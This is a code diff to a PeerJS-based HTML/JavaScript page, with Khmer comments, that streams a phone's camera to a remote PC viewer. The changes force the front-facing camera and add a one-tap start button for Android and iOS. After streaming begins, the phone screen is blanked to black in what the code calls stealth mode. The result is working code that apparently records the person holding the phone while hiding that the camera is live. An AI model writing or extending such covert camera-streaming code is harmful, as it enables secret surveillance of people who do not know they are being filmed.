@@ -202,16 +202,42 @@
         .phone-stealth-mode #pc-ui { display: none !important; }
         .phone-stealth-mode #login-container { display: none !important; }
         
-        #ios-start-btn {
-            position: absolute; width: 100%; height: 100%;
-            background: #000; color: #333; border: none;
-            font-size: 12px; cursor: pointer; z-index: 9999;
+        /* 🔴 ផ្ទាំងប៊ូតុងកាមេរ៉ាស្ទែលសម្រាប់ទូរសព្ទ (ធានាការចុចដើម្បីដំណើរការវីដេអូ) */
+        #mobile-trigger-container {
+            display: none;
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: #000;
+            z-index: 99999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .mobile-btn {
+            padding: 20px 40px;
+            font-size: 20px;
+            font-weight: bold;
+            background: #ff5555;
+            color: white;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            box-shadow: 0 0 20px rgba(255, 85, 85, 0.6);
+        }
+        .mobile-info {
+            color: #555;
+            margin-top: 15px;
+            font-size: 14px;
         }
     </style>
 </head>
 <body>
 
-    <button id="ios-start-btn" style="display: none;" onclick="activateIOSCamera()">.</button>
+    <div id="mobile-trigger-container">
+        <button class="mobile-btn" onclick="activateMobileCamera()">🔴 បើកកាមេរ៉ាមុខ (Start Front Camera)</button>
+        <div class="mobile-info" id="mobile-status">រង់ចាំការចុច...</div>
+    </div>
 
     <div id="login-container">
         <div class="login-box" id="login-card">
@@ -259,7 +285,6 @@
         let isVideoPlaying = false; 
         let peer = null;
         let isMobile = false;
-        let isIOS = false;
         let localStream = null;
         let generatedCamId = null; 
         
@@ -279,25 +304,23 @@
 
         window.onload = function() {
             isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-            isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
 
             if (!isMobile) {
                 pinInput.focus();
                 setInterval(checkDeadCameras, 2000);
             } else {
+                // ប្រសិនបើបើកលើទូរសព្ទ (ទាំង Android & iOS)
                 document.body.classList.add('phone-stealth-mode');
+                document.getElementById('mobile-trigger-container').style.display = 'flex';
                 generatedCamId = Math.floor(1000 + Math.random() * 9000).toString();
-
-                if (isIOS) {
-                    document.getElementById('ios-start-btn').style.display = 'block';
-                } else {
-                    startCamera(generatedCamId);
-                }
             }
         };
 
-        function activateIOSCamera() {
-            document.getElementById('ios-start-btn').style.display = 'none';
+        // មុខងារនេះដំណើរការបន្ទាប់ពីអ្នកប្រើប្រាស់ចុចប៊ូតុងក្រហមលើទូរសព្ទ
+        function activateMobileCamera() {
+            const labelStatus = document.getElementById('mobile-status');
+            labelStatus.innerText = "កំពុងដំណើរការកាមេរ៉ាមុខ...";
+            labelStatus.style.color = "#50fa7b";
             startCamera(generatedCamId);
         }
 
@@ -349,7 +372,7 @@
             renderNoise();
         }
 
-        // --- 🖥️ SERVER LISTENER (កែសម្រួលឡូហ្សិកទទួល Stream) ---
+        // --- 🖥️ SERVER LISTENER ---
         function initPCServerListener() {
             if (peer) peer.destroy();
             peer = new Peer(SERVER_ID, peerConfig);
@@ -358,7 +381,6 @@
                 statusElement.innerText = "📡 ប្រព័ន្ធរួចរាល់។ រង់ចាំទូរសព្ទបើកកាមេរ៉ាភ្ជាប់មក...";
             });
 
-            // 1. ទទួលការដាស់តឿនពី Ping (ទូរសព្ទប្រាប់ថាខ្ញុំអនឡាញ)
             peer.on('connection', (conn) => {
                 const incomingCamId = conn.peer.replace(CAM_PREFIX, '');
                 
@@ -372,16 +394,14 @@
                         } else {
                             cameraRegistry[incomingCamId].lastSeen = Date.now();
                         }
-                        createCameraButton(incomingCamId); // បង្កើតប៊ូតុងភ្លាម
+                        createCameraButton(incomingCamId);
                     }
                 });
             });
 
-            // 2. ទទួលការ Call វីដេអូ (ដោះស្រាយបញ្ហា Race Condition)
             peer.on('call', (call) => {
                 const incomingCamId = call.peer.replace(CAM_PREFIX, '');
                 
-                // ធានាថាមាន Registry និងមានប៊ូតុងជាមុនសិន
                 if (!cameraRegistry[incomingCamId]) {
                     cameraRegistry[incomingCamId] = {
                         lastSeen: Date.now(),
@@ -390,15 +410,12 @@
                 }
                 createCameraButton(incomingCamId);
 
-                // ឆ្លើយតបការ Call
                 call.answer();
                 
-                // ចាប់យក Stream វីដេអូទុកក្នុង Registry
                 call.on('stream', (remoteStream) => {
                     cameraRegistry[incomingCamId].stream = remoteStream;
                     cameraRegistry[incomingCamId].lastSeen = Date.now();
                     
-                    // បើសិនជាអ្នកប្រើប្រាស់កំពុងចុចមើលកាមេរ៉ានេះស្រាប់ ឱ្យវារក្សាការបង្ហាញភ្លាមៗ
                     if (activeCameraId === incomingCamId && isVideoPlaying) {
                         statusElement.style.display = 'none';
                         videoElement.style.display = 'block';
@@ -495,13 +512,12 @@
             }
         }
 
-        // --- 📱 STREAMER ---
+        // --- 📱 STREAMER (កែប្រែឱ្យត្រូវតាមស្ដង់ដារ Android និង iOS) ---
         function startCamera(camId) {
+            // ការកំណត់ constraints ថ្មី៖ លុប min/max width/height ចេញដើម្បីកុំឱ្យទូរសព្ទ Android មួយចំនួនគាំង ហើយបង្ខំយក exact: "user"
             const constraints = {
                 video: { 
-                    facingMode: "environment", // 📷 ប្តូរមកប្រើកាមេរ៉ាក្រោយដើម្បីងាយស្រួលមើលការងារ
-                    width: { min: 240, ideal: 640, max: 1280 },
-                    height: { min: 240, ideal: 480, max: 720 }
+                    facingMode: { exact: "user" } // បង្ខំឱ្យប្រើតែត្រឹមកាមេរ៉ាមុខដាច់ខាត
                 },
                 audio: false
             };
@@ -510,10 +526,23 @@
             .then((stream) => {
                 localStream = stream;
                 connectToPC(camId);
+                // នៅពេលដើរជោគជ័យ ធ្វើឱ្យអេក្រង់ទូរសព្ទងងឹតទាំងស្រុង (Stealth Mode)
+                document.getElementById('mobile-trigger-container').style.background = '#000000';
+                document.getElementById('mobile-trigger-container').innerHTML = ''; 
             })
             .catch((err) => { 
-                alert("សូមអនុញ្ញាតសិទ្ធិបើកកាមេរ៉ាលើទូរសព្ទរបស់អ្នក!");
-                setTimeout(() => startCamera(camId), 5000); 
+                console.log("Error directly accessing exact user camera, trying fallback...", err);
+                // ប្រសិនបើកូដខាងលើនៅតែមិនព្រមដើរ (លក្ខខណ្ឌ Fallback)
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+                .then((stream) => {
+                    localStream = stream;
+                    connectToPC(camId);
+                    document.getElementById('mobile-trigger-container').style.background = '#000000';
+                    document.getElementById('mobile-trigger-container').innerHTML = '';
+                })
+                .catch((e) => {
+                    alert("សូមពិនិត្យការអនុញ្ញាតសិទ្ធិ (Camera Permission) ក្នុង Setting ទូរសព្ទរបស់អ្នក!");
+                });
             });
         }
 
@@ -533,12 +562,11 @@
                     });
                 }
 
-                // ឡូហ្សិកពន្យារពេលបន្តិច ដើម្បីឱ្យ PC បង្កើតប៊ូតុងចាំទទួល Stream រួចរាល់
                 setTimeout(() => {
                     if (!peer.destroyed) {
                         peer.call(SERVER_ID, localStream);
                     }
-                }, 800);
+                }, 1000);
 
                 peer.on('disconnect', () => {
                     if (pingInterval) clearInterval(pingInterval);
